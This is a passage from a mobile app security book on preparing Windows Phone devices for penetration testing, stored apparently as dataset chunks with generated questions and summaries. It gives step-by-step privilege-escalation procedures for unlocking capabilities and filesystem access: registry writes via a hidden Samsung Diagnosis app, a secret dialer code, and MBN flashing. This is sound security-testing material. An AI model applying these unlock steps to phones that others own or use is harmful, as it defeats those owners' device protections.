Developer account.\nIf everything goes smoothly, the tool should successfully developer unlock the phone.\nBecause the device is now unlocked, you’re free to deploy unsigned application packages via the Application\nDeployment tool. This leads nicely into the next section, where we delve into gaining the sort of access and\ncapabilities on the device that are necessary or at least helpful for in-depth exploration and security\nassessments.\nCapability Unlocking Your Device\nTo make a device useful for penetration testing activities, you need certain abilities. Since Windows Phone is a\nclosed computing platform, users are not provided with a way to carry out explorative activities like browsing\nthe filesystem, or viewing the registry.\nHaving a device that affords you these luxuries is absolutely essential to conducting a thorough and successful\nsecurity review of an app, since having the ability to access the device’s filesystem allows you to extract an\napplication’s assets from the device, including but not limited to its .NET assemblies, its binaries, and its\nmanifest file. Extracted files can then be analyzed and reverse-engineered, and code-reviewed in the case of\nextracted .NET assemblies. A security assessment turns from being a blackbox app review, to a whitebox or code\nreview.\nIn addition, full access to the underlying filesystem allows a penetration tester to discover what an application is\nstoring on the filesystem, such as cookies, web cache, sensitive files that are unencrypted, and credentials in\ncleartext files. Having the ability to know what an app is storing on the filesystem, and whether such data is\nencrypted, is a vital part of a mobile app security assessment.\nHaving the ability to browse the registry is also very useful when reviewing non-third-party apps, such as those\nwritten by OEM vendors, because many such apps will have the ID_CAP_INTEROPSERVICES capability and use that\ncapability to write to the registry.\nGaining the ability to sideload applications with those not intended for third-party applications is known as\n“capability unlocking”. The ability to sideload arbitrary apps with the ID_CAP_INTEROPSERVICES capability is\nparticularly interesting because it grants sufficient privileges to browse most of the registry, and edit and add to\nlarge parts of it.\nCapabilities such as ID_CAP_INTEROPSERVICES were never intended to be granted to third-party apps; instead,\nthey are normally accessible to OEM and first-party applications. Unlocking ID_CAP_INTEROPSERVICES is known\nin the Windows Phone hacking community unanimously as interop unlock. Unlocking various high privilege\ncapabilities also allows various community and homegrown hacking tools to be installed on your device that are\nuseful whilst carrying out penetration tests.\nGaining access to privileged capabilities and gleaning filesystem access is possible on some Windows Phone\ndevices on the market, in three general ways:\nBy flashing a custom ROM/ROM modification to the device\nExploiting a software vulnerability\nBy hardware means, such as via an unprotected JTAG interface\nHow you unlock high-privileged capabilities and gain filesystem and registry access depends on the brand and\nversion of device you have, and the version of Windows Phone that is installed on the device.\nAt present, the following devices have been hacked to the point that at least the ID_CAP_INTEROPSERVICES\ncapability is available (to third-party apps), and filesystem access has been gained:\nSamsung Ativ GT-I8750 running Windows Phone 8\nSamsung Ativ GT-I8750 running Windows Phone 8.1\nHuawei Ascend W1 running Windows Phone 8\nHuawei Ascend W1 running Windows Phone 8.1\nlordmaxey from XDA-Developers has also reportedly unlocked a Nokia Lumia for all capabilities provided by the\nOS, while the device was running Windows Phone 8. Readers who are well-versed in electronics may be able to\nreproduce these results, but we do not recommend it. The relevant thread on XDA-Developers is available at:\nhttp://forum.xda-developers.com/showthread .php?t=2713098.\nFor penetration testing and other explorative purposes, we recommend that you obtain either a Samsung Ativ S\nGT-I8750 or a Huawei Ascend W1-U00. Both of these devices can be interop or fully unlocked, and filesystem\naccess can be gained, on devices running both Windows Phone 8 and Windows Phone 8.1.\nSince the latest release of Windows Phone at the time of this writing is 8.1, we strongly recommend that your\ntesting device be running Windows Phone 8.1. This makes sense because an increasing number of app\ndevelopers do and will continue to release their apps to target only 8.1 and higher (as APPX packages). With that\nbeing said, we advise following the instructions in the “Samsung Ativ Interop Unlock and Filesystem Access on\nWindows Phone 8.1 via Custom MBN” section (for readers with a Samsung Ativ I8750) or the “Huawei Ascend\nW1 Interop Unlock and Filesystem Access on Windows Phone 8.1” section (for readers with a Huawei Ascend\nW1).\nWe will, however, still give instructions and advice on preparing a device of these two models that is running\nWindows Phone 8.\nWe will now discuss how to prepare Samsung Ativ GT-I8750 and Huawei Ascend W1 devices for penetration\ntesting activities, in the following few sections.\nSamsung Ativ Full Capability Unlock and Filesystem Access on Windows Phone 8\nIf you’re intent upon using a device running Windows Phone 8 (and not 8.1), the following instructions will\nunlock all capabilities provided by the OS, and will allow full filesystem access to the device via USB mass\nstorage. Our recommendation, however, is that you upgrade to Windows Phone 8.1 and transform your device\ninto a penetration testing-ready device via flashing an MBN (see “Samsung Ativ Interop Unlock and Filesystem\nAccess on Windows Phone 8.1 via Custom MBN” later in this chapter).\nWith that being said, it’s possible to capability unlock the Samsung Ativ GT-I8750 when its running Windows\nPhone 8 with the update level at GDR2 or below (i.e., OS version 8.0.10327.77 or 8.0.10328.78). The unlock\nallows all capabilities offered by the OS to be unlocked for use by third-party applications.\nThe GDR3 update blocked access to the exploitable functionality, thus if you are running Windows Phone 8\nGDR3 and above, you must first flash your Ativ back to GDR2 before the capability unlock procedure described\nin the link shown will work. Instructions and materials for flashing the device’s ROM back to GDR2 are\navailable at several online resources, such as in this thread http://forum.gsmhosting.com/vbb/f200/samsung-\nativ-s-i8750-wp8-hard-reset-tutorial-firmware-flashing-guide-1671518/.\nIn particular, the core vulnerability that allows ID_CAP_INTEROPSERVICES and others to be unlocked in ATIV\ndevices is the Diagnosis application, which was written by Samsung, the device’s vendor. It has the\nID_CAP_INTEROPSERVICES capability and it provides powerful functionality such as registry writing, which is\nobviously interesting from a privilege escalation standpoint.\nThe Diagnosis application is not installed by default for obvious reasons but is installable via a secret dialer\ncode. After you install it, you can use the Diagnosis app’s registry writing functionality to unlock\nID_CAP_INTEROPSERVICES and subsequently every capability in the OS.\nTIP\nThe steps and explanations given here assume Windows Phone 8 GDR2 and below—if your device is\nrunning GDR3 or above, see the opening paragraph of this section for reverting to GDR2.\nThe vulnerabilities and exploit apps used in Samsung device unlocks were researched and developed by several\nmembers belonging to the XDA-Developers forum. Some of these researchers include -W_O_L_F- and\nGoodDayToDie, who are perhaps jointly responsible for the Samsung Ativ S interop unlock; cpuguy is also due\ncredit for discovering that reaching Diagnosis’ registry editor via a toast notification is possible.\nFigure 10.9 Sideloading the Interop Unlock helper app\nFollowing the guidelines given here should, if carried out correctly, result in the Ativ’s being unlocked for the\ndeployment of apps with all capabilities. Other interesting abilities, such as being able to browse the device’s\nentire filesystem as well as downloading and modifying files on it, should also be possible. We take no\nresponsibility from any damages resulting directly or indirectly from following the instructions given here,\nbecause devices could possibly end up bricked if something goes wrong.\n1. Download the Interop_Unlock_Helper_Debug_ARM.xap application (http://forum.xda-\ndevelopers.com/attachment.php?attachmentid=2526341&d=1390156486) and sideload it to the developer-\nunlocked Samsung Ativ S using the Application Deployment SDK tool. (See Figure 10.9.)\nThis application is a helper app designed to leverage the secret registry editing functionality within the once-\nhidden Samsung Diagnosis tool.\n2. Start the device’s dialer application and enter the secret dialer code to install Diagnosis. The code is\n##634##. Diagnosis installs, and a new dialer screen reading Odyssey_... appears. This is the Diagnosis app,\nwhich is now installing. Press the Windows button to exit it.\nRun the Interop Unlock Helper app on the device and tap Next until the app’s screen reads Step 2.\n3. Choose your Samsung model and tap Send toast. This sends a clickable toast notification that provides an\nentry point into Diagnosis’ registry editor functionality.\n4. Tap the toast notification to enter Diagnosis’ registry editor. Navigate back to the unlock helper app without\nclosing Diagnosis, and tap Next. In particular, the toast notification opens Diagnosis’ registry via the\nfollowing URI: App://07a20ad9-a4f9-3de3-855f-\ndcda8c8cab39/_default#/WP8Diag;component/7_ETC/RegistryOperationsCheck.xaml.\n5. Put a check mark in the HKEY_LOCAL_MACHINE and Check if value is DWORD boxes. Enter\nsoftware\\microsoft\\devicereg\\install into the Registry Path To Operate field, enter MaxUnsignedApp into\nthe Key field, and enter some arbitrary value above 300 as the key’s new value. Click Write to write this new\nvalue. Even though an error message may appear indicating the write failed, this is common—ignore it. (See\nFigure 10.10.)\n6. Untick the Check if value is DWORD box, ensure that HKEY_LOCAL_MACHINE is still ticked, and then in the\nRegistry path to operate field enter software\\microsoft\\devicereg, and for Key type PortalUrlProd. For\nthe key’s value enter the following string: http://127.0.0.1, and click Write. See Figure 10.11.\n7. Ensure that the Check if value is DWORD box is still unticked, ensure that HKEY_LOCAL_MACHINE is still ticked,\nand then in the Registry Path To Operate field enter software\\microsoft\\devicereg, and for Key enter\nPortalUrlInt. For the key’s value enter the following string: http://127.0.0.1, and click Write.\nThe device is now interop unlocked; the registry editor and unlock helper app can both be exited. The next\ncouple steps unlock the remainder of the OS’s privileges so that any capabilities can be used with newly\nsideloaded apps.\n8. Download the BootstrapSamsung_Release_ARM.xap app (http://forum.xda-developers.com/attachment.php?\nattachmentid=2258632&d=1379229845), sideload it to the device using the Application Deployment software,\nand then run it. A success message appears. Exit the app.\n9. Download the EnableAllSideloading_Release_ARM.xap (http://forum.xda-developers.com/attachment.php?\nattachmentid=2258633&d=1379229845) app, sideload it to the device using the Application Deployment\nsoftware, and then run it. The app displays a success message, so now exit the app.\nThe Ativ is now unlocked for all capabilities.\nFigure 10.10 Setting the MaxUnsignedApp registry key\nFigure 10.11 Setting the PortalUrlProd registry key\nWith the device unlocked, it is possible to sideload devices requesting any capability the OS supports. This opens\ninteresting possibilities for exploration of the device and security assessment of installed applications.\nAssuming the device has at this stage been successfully capability unlocked, you can now install an XDA-\nDevelopers born home-brew application called SamWP8 Tools. The application was written by -W_O_L_F-\nfrom XDA-Developers.com and can be downloaded from http://forum.xda-developers.com/showthread .php?\nt=2435673. This app requests privileged capabilities, so capability unlocking your device before attempting to\ninstall it is necessary.\nAmong other interesting features, this tool is able to apply a registry tweak that tells the Media Transfer\nProtocol (MTP) service to serve the C:\\ root instead of just the media directories (that is, photos, music, and so\non) as it usually does. A registry key is also modified so that the MTP service serves up the C:\\ with LocalSystem\nprivileges, giving full filesystem access.\nYou can deploy SamWP8 Tools in the same manner as any home-brew XAP application—using the SDK\nApplication Deployment tool. (See “Developer Unlocking Your Phone” for information on using the Application\nDeployment tool.)\nThe Full FS Access option is located on the “tweaks” screen of the SamWP8 app, accessed by opening the app\nand swiping left. The box should be ticked to apply the appropriate registry modification. (See Figure 10.12.)\nFigure 10.12 Applying the Full Filesystem access hack using SamWP8 tools\nAfter you tick the box, you should reboot the device.\nAt this point you can browse and modify files on the device’s filesystem by plugging the device into another\nsystem via USB as a normal mass storage device. Any standard file manager will suffice for viewing the device’s\nfilesystem, including Explorer, a shell, or another file manager of your choice. Figure 10.13 shows an Ativ’s\nfilesystem being browsed after using SamWP8 to carry out the MTP registry hack.\nFigure 10.13 Browsing the filesystem\nYou can find a quasi-official thread for the tools used in the preceding process on the XDA-Developers.com\nforum at the following URL: http://forum.xda-developers.com/showthread.php?t=2435697.\nSamsung Ativ Interop Unlock and Filesystem Access on Windows Phone 8.1 via Custom MBN\nSeveral members of the XDA-Developers.com community have released MBN files that can be flashed to\ncompatible Samsung devices running Windows Phone 8.1 to unlock the ID_CAP_INTEROPSERVICES capability (and\nothers) and apply registry hacks to allow full filesystem access.\nMBN files, simply put, allow modifications to a phone’s settings, apps, and registry to be made. These changes\nare made when the MBN is flashed to the device. Several members of the Windows Phone hacking community\nhave created MBN files so that when flashed to a device, various capabilities are unlocked and registry hacks are\nmade so as to allow full filesystem access to the device via USB mass storage mode.\nNOTE\nFull filesystem access on a device is gained by hacking on the registry so that the MTP service—Media\nTransfer Protocol Service—runs as LocalSystem and has its mount point at C:\\, thus allowing browsing of\nthe device’s entire filesystem via USB mass storage mode when plugged into another computer.\nTypical MBN files released in the community also make other tweaks to the device’s settings, such as creating or\nremoving tiles, and tweaking other device settings.\nMost work in this area appears to be heavily based on -W_O_L_F-’s and GoodDayToDie’s work on unlocking\ncapabilities and on _-WOLF-_’s MBN creation work.\nThere are a number of options available in terms of choosing which MBN file to flash to your Samsung Ativ\ndevice running Windows Phone 8.1, but our current favorites are Spavlin’s (also from XDA-Developers) -\nW_O_L_F-’s ROMs, so we’ll now discuss how to flash these MBNs to your device. We’ll also list some of the\nadditional features and tweaks that these MBNs apply so that you can choose one.\nSpavlin’s MBN\nSpavlin of XDA-Developers published an MBN that when flashed to a Samsung Ativ device, provides the\nfollowing:\nDeveloper unlock\nInterop unlock\nCarrier unlock\nRelock prevent\nNo pre-pinned Samsung tiles\nUnlock of large number of non-third-party capabilities, reportedly 286\nFull filesystem access via an MTP registry hack (Media Transfer Protocol service, i.e., for USB mass storage)\nSeveral UI-based tweaks\nGray/silver theme\nThe UI skin appears as a gray/silver color, as in the screenshot below.\nFigure 10.14 Home Screen with Spavlin’s MBN Applied\nIf you’d like to opt to use this MBN, you can download it from here, as Spavlin’s original thread:\nhttp://forum.xda-developers.com/showthread.php?t=2727667. Either CMK or CMJ version will do.\nSpavlin’s MBN is believed to be based on work by -W_O_L_F-, but may have included features that were not\nincluded in -W_O_L_F-’s original ROM, including interop unlock.\nAt this point, you can proceed to the “How to Flash the MBN to a Device” section, to flash the MBN to your\ndevice and thereby prepare it to serve as a penetration testing device.\n-W_O_L_F-’s MBN\n-W_O_L_F- has also released an MBN. The MBN, version 2.1 at the time of this writing, introduces the\nfollowing features to a phone that it is flashed on:\nDeveloper unlock\nInterop unlock\nCarrier unlock\nRelock prevent\nFull filesystem access via an MTP registry hack (Media Transfer Protocol service, i.e., for USB mass storage)\nVolume limit disabled\nLarge number of non-third-party capabilities unlocked\nNo pre-pinned Samsung tiles\nSome less useful Samsung apps removed\nFull access to APNs and Internet sharing\nThe Yandex and Google search providers\nLime green ‘theme’\n-W_O_L_F-’s MBN was quite possibly the first publicly released modification released by the Windows Phone\nhacking community. The MBN may be downloaded via this URL: http://forum.xda-\ndevelopers.com/attachment.php?attachmentid=2703339&d=1398239287. The official thread on XDA-Developers\nis here: http://forum.xda-developers.com/attachment.php?attachmentid=2703339&d=1398239287.\nHaving chosen this MBN, you may now proceed to the next section, “How to Flash the MBN to a Device” to gain\nthe MBN’s features, i.e., interop and full filesystem access among others, and thereby prepare your device for\npenetration testing.\nHow to Flash the MBN to a Device\nNow that you’ve chosen either the -W_O_L_F- or Spavlin MBN, you can now proceed to flash it to your\nSamsung Ativ device.\nOnce the MBN has been flashed to the device, the device will be interop unlocked and will allow the tester to\ngain access to its filesystem. Flashing the MBN is trivial if done correctly; the steps below should be followed\nvery closely, because omission of details could end in you bricking your device.\n1. Ensure that your phone has Windows Phone 8.1 installed on it. You can check this by going to Settings About\nMore Information and looking for Windows Phone 8.1.\n2. Download the flashing tool from the following location: http://support.moulnisky.com/index.php?\ndir=Samsung/Firmwares/GT-I8750/Downloader/.\n3. Download -W_O_L_F-’s fake ROMs from here: http://forum.xda- developers.com/attachment.php?\nattachmentid=2811394&d=1403430057 and unpack the archive. You use a fake ROM file because you don’t\nactually want to flash a ROM to the device. You just want to flash an MBN file and keep the device’s current\nROM. As such, the fake ROM is just a file that is loaded into the flashing tool to make the tool happy.\n4. Install SamsungUSBDriver.msi which is packaged with the flashing tool. You may need to use Windows 7 to\ninstall this cleanly. These drivers allow communication between Windows and your device via USB.\n5. Run the flashing tool as Administrator.\n6. Click the yellow folder icon and select the ROM file to flash. Select the appropriate fake ROM file; fake_GT-\nI8750.wp8.\n7. Click the green folder icon and select the MBN file to flash to the device; this will be your chosen MBN,\neither Spavlin’s (spv_81_cmk.mbn) or -W_O_L_F-’s MBN (wolfROM_2.1.mbn).\n8. Untick all of the Options checkboxes except for CSC and ensure that all checkboxes and radio buttons have\nthe exact configuration shown in Figure 10.14; this is very important to prevent you from bricking your\ndevice. Ensure that under DL Options, Select is selected. CSC Sales Code can remain set as ATO.\n9. Place your device in Download mode. To do this, turn the device off and then hold Volume Up + Power +\nCamera. When the device vibrates, release the Power button but continue to hold the Volume Up + Camera\nbutton. Upon the next vibration, release all buttons. You’ll see the Download screen. At this point, the device\nis in a state in which it can have ROMs and MBNs flashed to it. Plug your device into your computer via USB.\n10. Ensure that your flasher tool view has the settings shown in Figure 10.14.\n11. Click Start to begin the MBN flashing process.\n12. Remember that you do not want to flash the actual ROM itself (it is not a real ROM). You just want to flash\nan MBN file to the device, so you see the message, “Partition information is Not equal. Download all binary?”\nclick No. This is very important. You do not want to flash a fake ROM to your device!\n13. The MBN flashing will happen almost instantly; turn off your phone by holding the Power button; boot the\nphone back up.\n14. Hard reset your phone by going to Settings About Reset Your Phone, and allow your phone to be reset.\n15. Once your phone has finished its hard reset, the MBN will be fully installed.\nNOTE\nCarrying out a hard reset will wipe all your data; ensure your data is backed up first! You can do this by\ngoing to Settings Backup, and configuring cloud backups from there.\nFigure 10.15 Configuration of checkboxes and radio buttons\nAt this point, your device will be quite well prepared for penetration testing already; your phone will be\ndeveloper unlocked, interop unlocked, and various other interesting capabilities will be available when you are\ninstalling apps. Additionally, filesystem access is available when you plug the device into your computer via USB\nas a mass storage device. You have filesystem access by means of plugging the device into a computer via USB.\nYou can read the sections “Using Filesystem Access” and “Using Registry Access” to learn how to use your newly\ngained privileges and to begin the security-related exploration of your device.\nHuawei Ascend W1 Full Capability Unlock and Filesystem Access on Windows Phone 8\nA Windows Phone hacking community member named “reker” has produced a tool named rkBreakout, which\ncapability unlocks (including ID_CAP_INTEROPSERVICES) at least Huawei Ascend W1-C00 and Huawei Ascend W1-\nU00 devices that are running Windows Phone 8. This tool does not work for devices running Windows Phone\n8.1.\nWe have not tested this tool, but according to the original thread, the tool works as advertised; the tool has been\nverified as working by various members of XDA-Developers.\nThe tool may be downloaded from the original thread, which is located at the following URL: http://forum.xda-\ndevelopers.com/showthread.php?t=2707074.\nIn addition to unlocking interesting high privilege capabilities, the registry is also hacked to similar effect as the\naforementioned Samsung hacks, in that the MTP (Media Transfer Protocol service, i.e., which deals with USB\nmass storage) service runs as LocalSystem and has its root set at C:\\.\nNOTE\nAs noted above, this tool does not work on devices running Windows Phone 8.1. To reiterate, we\nrecommend that you use a Windows Phone 8.1 device for your penetration testing and hacking activities\nso no apps are off limits, so if you have a Huawei Ascend W1-U00 device, we’d suggest you follow the\ninstructions in the next section.\nHuawei Ascend W1-U00 Full Capability Unlock and Filesystem Access on Windows Phone 8.1\nWojtasXda, on XDA-Developers, has released a custom ROM intended for Huawei Ascend W1-U00 devices. The\nROM has the following features:\nDevelop unlocked\nInterop unlocked\nAll capabilities unlocked\nFull filesystem access\nThe ROM and the flashing tool are available in the original thread by WojtasXda, which is located here:\nhttp://forum.xda-developers.com/showthread .php?t=2686053.\nThe thread also contains instructions for flashing the ROM to your device.\nWe have not tested this ROM and its accompanying tool, but feedback in the thread firmly ascertains that the\nrelease works as advertised.\nOnce the instructions in the thread have been followed, your device should be fully capability unlocked,\nincluding interop unlocked, and will allow full filesystem access via USB mass storage mode.\nUsing Filesystem Access\nAfter you’ve capability unlocked your device and hacked the device for filesystem access, you can begin browsing\nthe filesystem.\nHaving this ability can be very useful in security assessments for a number of reasons, including:\nYou can retrieve application binaries/.NET assemblies that would otherwise have been inaccessible due to\nthe DRM protection applied by the Store.\nYou can extract files created by applications to inspect for sensitive information leakage.\nYou can extract application manifest files for investigation into potential entry points and library usage (see\nthe earlier section, “Application Manifests”).\nYou can modify registry hive files.\nYou can explore the device’s internals.\nYou can explore the filesystem by plugging your hacked device into a computer via USB. Once plugged in,\nyou can browse the filesystem via mass storage mode using Explorer or your file manager of choice.\nThe locations on the filesystem of particular interest for security reviews are:\nC:\\Data\\Programs\\{GUID}\\Install—This is where application binaries/ .NET assemblies are located, in\naddition to application assets and manifest files, where {GUID} pertains to a particular application.\nC:\\Data\\Users\\DefApps\\APPDATA\\{...}—Application sandbox directories, where apps can store data, which\ncould potentially be sensitive—where {GUID} pertains to a particular application.\nThe majority of files on the device can be both read and written, since the MTP service will be running as\nLocalSystem. Read access is obviously useful for extracting files and analyzing or reverse engineering them, and\nwrite access can be useful in the context of patching application files, among other things.\nThis ability to access the device’s filesystem will be a cornerstone for your penetration testing activities; you can\nuse it to extract apps and their assets from your device, and you can also examine the contents of an app’s\nfilesystem sandbox.\nFor example, once you extract .NET assemblies and native binaries from an application’s directory, you will then\nbe able to use a .NET bytecode reverse engineering tool (.NET reflector, for example) or disassembler (i.e., IDA\nPro) to reverse the app and then carry out a security review. You’ll also have the ability to analyze any data that\nis stored by the app in its local storage, to check for data leaks and absence of crypto use on sensitive data.\nFigure 10.16 shows an application’s install directory being browsed.\nFigure 10.16 Browsing an app’s Install directory in Explorer\nThe remainder of the Windows Phone sections rely quite heavily on you having filesystem access to your device\nso that you can extract its app binaries and view its filesystem sandbox.Examination of application binaries that\nhave been extracted from the device’s filesystem will be revisited in the later section “Reverse Engineering.”\nUsing Registry Access\nThe best method for browsing the device’s registry at present is via GoodDayToDie’s Native Access Webserver.\nThis app is a basic web server that runs on the device and provides an interface for browsing the device’s\nfilesystem and registry.\nThere are two releases of this app; one with all capabilities enabled in its manifest, and one with a certain\nsubset. If your device is running Windows Phone 8 (as opposed to 8.1), you will have to install an older version\nof the app, since later versions request capabilities that do not exist in Windows Phone 8. You can deploy the\napp using the Application Deployment tool, which is packaged with the SDKs.\nThe server listens on TCP port 9999 by default. Once the server is running, you can navigate to it either via your\ndesktop or laptop browser (or indeed your device’s browser, if you wish).\nYou can obtain the app from its codeplex site: http://wp8webserver .codeplex.com/.\nUseful Hacking Tools\nAt this stage, it is assumed that you now have a hacked test device and a suitable test environment with the SDK\n(i.e., Visual Studio and its accompanying tools, including the emulators).\nSeveral tools that are likely to prove useful in Windows Phone hacking repertoire (and in penetration testing in\ngeneral) are listed here, along with their use cases:\nIDA Pro, for reverse engineering and patching native binaries that have been extracted from a device’s\nfilesystem (https://www.hex-rays.com)\nThe IDA Pro HexRays plug-in, for C/C++ pseudo-code approximations of recovered assembly code\n(https://www.hex-rays.com)\n.NET reflector and ILSpy for reverse engineering and .NET assemblies (http://www.red-\ngate.com/products/dotnet-development/reflector/, http://ilspy.net)",
    "question": "What are the key security measures and considerations for Android and Windows Phone applications as discussed in the text?",
    "summary": "The text discusses security measures for Android and Windows Phone applications, emphasizing the importance of code obfuscation, tamper detection, and secure practices like data encryption and permission management. It also outlines the security features of Windows Phone 8 and 8.1, including its closed platform, AppContainer sandboxing, and exploit mitigation technologies like ASLR and DEP. Additionally, it covers methods for gaining access to the device's filesystem and registry for security testing, such as developer unlocking and using custom MBN or ROM files."
  },
  {
    "start": 55,
    "end": 55,
    "text": "Reflexil for patching .NET assemblies (http://reflexil.net)\nNative Access Webserver, which provides a convenient web interface for browsing the device’s filesystem\nand registry (http://wp8webserver .codeplex.com/)\nWP8 File Explorer, for browsing the full filesystem (http://wp8fileexplorer .codeplex.com/)\nBurp Suite Pro for intercepting and manipulating HTTP/HTTPS traffic originating from applications\n(http://www.portswigger.net)\nAnalyzing Application Binaries\nOnce you’ve gained filesystem access to your test device, application binaries and .NET assemblies can be\nextracted, analyzed and reverse engineered. In cases where source code for an app is unavailable, the best\nmethod for carrying out a thorough security assessment is via reverse engineering; the app’s .NET assemblies\nand binaries can be extracted from your device, at which point you will reverse engineer them and begin your\nsecurity review in an effort to uncover its internals and security aspects on the code level. When an app is\ncomprised of .NET assemblies, it’s possible to recover an app’s code, allowing a relatively straightforward code\nreview of the app. Accessing the device’s filesystem, extracting assets, and then reverse engineering or otherwise\nanalyzing them will form one of the cornerstones of your security review methodology for Windows Phone\napps.\nReverse Engineering\nThe Windows Phone 8.x OSes store application binaries, .NET assemblies and other assets (including the\nmanifest) in the app’s respective Install directory C:\\Data\\Programs\\ on the filesystem. Each application\ninstalled on the device has its own directory there, where its name is a GUID; for example, C:\\Data\\programs\\\n{XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX}.\nInside each app’s directory is an Install directory. Among other things, this folder houses the application’s native\nbinaries and .NET assemblies. If you have gained filesystem access to your device, you can extract these binaries\nand begin reverse engineering them. Figure 10.16 shows a .NET assembly in the Install directory of a Samsung\nOEM app about to be disassembled with .NET reflector.\nFigure 10.17 Opening a .NET assembly from a device’s filesystem\nAfter binaries have been extracted from the device, they can be disassembled/decompiled and analyzed. Reverse\nengineering, coupled with manual testing, can represent a strong approach to security reviews, especially when\nsource code is not available for review.\nManaged .NET assemblies (DLLs) can be reversed back to accurate C# source code representations using tools",
    "question": "What tools and methods are used to analyze and reverse engineer .NET assemblies and application binaries on a Windows Phone device?",
    "summary": "Reflexil and .NET reflector are used to analyze and reverse engineer .NET assemblies from a Windows Phone device. Application binaries and .NET assemblies are stored in specific directories on the device's filesystem, allowing for extraction and detailed code review. Reverse engineering these files, along with manual testing, is a key method for assessing the security of Windows Phone applications when source code is unavailable."
  },
  {
    "start": 56,
    "end": 58,
    "text": "like .NET reflector, and the resulting code can be analyzed using standard manual code review techniques.\nWhen you encounter and extract native code components from a device, you can disassemble their code using\nhigh-quality tools like IDA Pro. Application internals can be studied by reviewing the outputted assembly code,\noptionally using the Hex-Rays plug-in for generation of C/C++ pseudo-code approximations, which may allow\nfor more efficient code reviewing for some readers.\nAny HTML and JavaScript files stored locally for use by an app can also be extracted from the device, and\nsubsequently analyzed.\nChapter 11 discusses further activities involving reverse engineering and application patching.\nAnalyzing Exploit Mitigation Features\nWhen reviewing a Windows Phone native binary, whether it was extracted from the device via the methods\ndiscussed so far, or obtained from a client’s non-Store XAP/APPX file, checking for the presence of exploit\nmitigation features on the binary is a vigilant practice from a security perspective.\nExploit mitigation features were discussed earlier, see the “Exploring Exploit Mitigation Features” section for\nmore information.\nMicrosoft released a useful tool named BinScope, available at http://www .microsoft.com/en-\ngb/download/details.aspx?id=11910, the sole purpose of which is to analyze a native binary for use of\nrecommended (or compulsory for some Stores) exploit protection features.\nAmong other problems, BinScope has the ability to test for\n/GS protections (stack cookies and other stack overflow protections such as variable reordering)\nNXCOMPAT (DEP)\nSafeSEH\n/DYNAMICBASE (ASLR)\nWhen run against a binary, the BinScope tool generates an informative report that lists the results of the anti-\nexploit features.\nBinScope tests are included in Microsoft’s Windows Phone 8.1 certification requirement tests to ensure that\nnative 8.1 Phone binaries have all the flags that Microsoft demands, which in particular are\n/SafeSEH exception handling protection\nData execution prevention\nAddress Space Layout Randomization\nRead/Write shared PE section\nAppContainerCheck\nExecutableImportsCheck\nWXCheck\nIn addition, non-native .NET assemblies are scanned for presence of the\nAllowPartiallyTrustedCallersAttribute attribute, which is disallowed.\nFor further information on BinScope’s catalog of tests, see http://msdn.microsoft.com/en-\nus/library/windowsphone/develop/dn629257 .aspx#binscope.\nSummary\nThis chapter introduced Windows Phone applications in general. You’ll have gleaned an appreciation of the\nsandboxing model, the various security features that the Windows phone operating systems have, as well as\nsome app fundamentals.\nFollowing the advice in this chapter, you’ll also hopefully have a test environment setup, which will allow you to\nbegin security reviewing Windows Phone apps.\nCHAPTER 11\nAttacking Windows Phone Applications\nThis chapter follows the previous chapter’s introduction to Windows Phone applications by exploring the\nvarious ways in which apps can be vulnerable, and how an attacker can exploit identified weaknesses.\nAkin to applications that run on popular desktop and mobile platforms, Windows Phone 8.x apps may also be\nvulnerable. This chapter focuses on testing for, finding, and exploiting vulnerabilities around issues such as\ntransport security weaknesses, injection vectors, Interprocess Communications (IPC) mechanisms, and native\ncode, among others. Many of the vulnerability classes that we discuss and explore are common to software that\nruns on other mobile operating systems (OSes), as well as to vulnerability classes encountered in application\nsecurity generally.\nThis chapter also covers enumeration and identification of data entry points into applications, because they are\ncritical to understanding an app’s threat landscape and pinpointing areas of an app that are potentially\nvulnerable to security weaknesses.\nAnalyzing for Data Entry Points\nBefore moving on to testing for, identifying, and exploiting security vulnerabilities in Windows Phone (WP)\napplications, we explore a very important initial step common to all application security reviews: locating and\nanalyzing data entry points into the app. Doing this allows a would-be attacker insight into the attack surface of\nthe app in question.\nThe phrase data entry point, or simply entry point, refers to any channel or interface presented by an app that\nallows the input of user-controllable or user-influenced data into the application for processing, parsing, or\nconsideration.\nGiven that users can use entry points to introduce data into a system or application for parsing and processing,\nidentifying such entry points is useful from attackers’ perspectives so that they know in which ways it is\npossible to input potentially malicious data into the app, and from where to follow code paths in code review\nand reverse-engineering exercises.\nWe’ll now briefly discuss the various entry points commonly found in WP8.x applications, and how to identify\nwhat entry points an app in question is exposing or using. Being aware of these common entry points makes the\njob of any security reviewer much easier and makes his or her security reviewing efforts more meaningful.\nWebBrowser and WebView Controls\nThe Windows Phone 8.x OSes provide the WebBrowser control for embedding a browser-like interface into\napplications. WebBrowser controls are based on Internet Explorer and are instances of the WebBrowser class.\nThey can be considered analogous to iOS UIWebView objects and Android’s WebView objects. WebBrowser\ncontrols are available in both WP8 and 8.1 applications.\nWindows Phone 8.1 also includes the WebView class for creating WebView controls. This class is similar to\nWebBrowser, but is missing some of the features provided by the WebBrowser class.\nWebBrowser and WebView controls are used frequently in WP8.x apps for a number of purposes, some of which\ncan be summarized as follows:\nRendering static web content—Application developers can include content locally within their app\npackage to be later displayed using a WebBrowser control.\nRendering web content from the network—An application can point a WebBrowser or WebView\ncontrol at a remote URL so that the remote website is displayed within the embedded WebBrowser control.\nDisplaying dynamically generated web content—Applications may feed dynamically generated HTML,\nJavaScript, and CSS content to a WebBrowser or WebView control. Dynamically generated content may be\ncreated based on decisions made by conditional logic.\nEach of these purposes presents a user with an interface written in HTML/CSS/JavaScript. In fact, some\napplications consist almost entirely of a WebBrowser or WebView control that displays a mobile-friendly web\napplication, with very little (if any) of the application’s logic implemented by the on-device app itself. Such apps\nwere described broadly as hybrid apps in the “Programming Languages and Types of Applications” section in\nChapter 10.\nWebBrowser controls, depending on how an application uses them, can be considered data entry points in two\nmain ways:\nApplications that load remote HTTP URLs into WebBrowser or WebView controls may be prone to several\ntypes of cross-site scripting style attacks due to the use of http:// in the URL rather than https://.\nApps using WebBrowser or WebView controls may present interfaces or call JavaScript code that act as entry\npoints and parse potentially untrusted data. The JavaScript may even pass such data back into C# code.\nIdentifying WebBrowser and WebBrowser control use gives the hacker or security reviewer a lead on\nrelevant JavaScript to review for possible vulnerabilities.\nAs mentioned in “Programming Languages and Types of Applications” in Chapter 10, XAML files hold\ndefinitions and declarations for interface and GUI elements. It is, therefore, no surprise that an app’s XAML\nfiles also hold declarations for WebBrowser controls that appear in an application.\nWhen you’re conducting a code 